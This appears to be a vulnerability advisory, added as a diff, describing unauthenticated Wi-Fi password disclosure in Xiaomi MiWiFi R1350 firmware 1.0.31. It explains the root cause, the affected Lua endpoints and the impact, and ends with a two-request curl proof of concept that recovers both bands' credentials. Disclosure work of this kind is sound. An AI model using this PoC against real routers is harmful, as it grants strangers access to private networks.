@@ -1,0 +1,24 @@
+Xiaomi MiWiFi R1350 (AIoT Router AC1200) firmware version 1.0.31 contains an unauthenticated sensitive information disclosure vulnerability (CWE-200) that leaks the plaintext Wi-Fi passwords of both radio bands.
+
+Vulnerable component: /usr/lib/lua/luci/controller/api/misystem.lua, functions getWifiPwdUrl() and getWifiPwd(), exposed without authentication (route flag 0x09 = noauth) at:
+- GET /cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=<key>
+- GET /cgi-bin/luci/api/misystem/get_wifi_pwd?token=<token>
+
+Root cause: the flow is Xiaomi's IoT provisioning handshake, in which the router returns Wi-Fi credentials encrypted with a requester-supplied RSA public key. The public key is fully attacker-controlled and unauthenticated (getWifiPwdUrl simply caches the rsa_pubkey parameter), so an attacker supplies their own public key and decrypts everything locally. The access token is the device UUID read from /proc/sys/kernel/random/uuid; it is not a secret because get_wifi_pwd_url itself returns it RSA-encrypted under the attacker's key, and the 300-second validity window is armed by the attacker's own request.
+
+Format notes: the firmware's read_txt() only reads a single line and librsa.so (mbedTLS) accepts a single-line base64 (SPKI DER) public key, so the rsa_pubkey parameter must be supplied as one-line base64.
+
+Exploitation conditions: LAN access only; no authentication, no admin password, works on initialized and uninitialized devices.
+
+Impact: an unauthenticated LAN attacker retrieves both the 2.4G and 5G SSID/password pairs in plaintext and joins the network, breaking the router's core trust boundary and enabling further attacks against the (partly unauthenticated) LAN attack surface.
+
+PoC (two unauthenticated requests):
+1) Generate an RSA-2048 keypair; send the public key as single-line base64:
+   curl "http://ROUTER/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=MIIBIjANBg..."
+   -> {"url":"<base64(RSA_attackerkey(url with token))>","code":0}
+   Decrypt "url" with the attacker private key (PKCS1v15) -> "...get_wifi_pwd?token=<uuid>"
+2) curl "http://ROUTER/cgi-bin/luci/api/misystem/get_wifi_pwd?token=<uuid>"
+   -> {"info":"<base64(RSA_attackerkey(json))>","code":0}
+   Decrypt "info" -> {"2gssid":...,"2gpwd":...,"5gssid":...,"5gpwd":...}
+
+Verification: dynamically confirmed against the firmware emulated with qemu-mips (user mode) + chroot running the original nginx -> fcgi-cgi -> LuCI stack; both blobs were decrypted and the plaintext Wi-Fi credentials were recovered without any session or password.
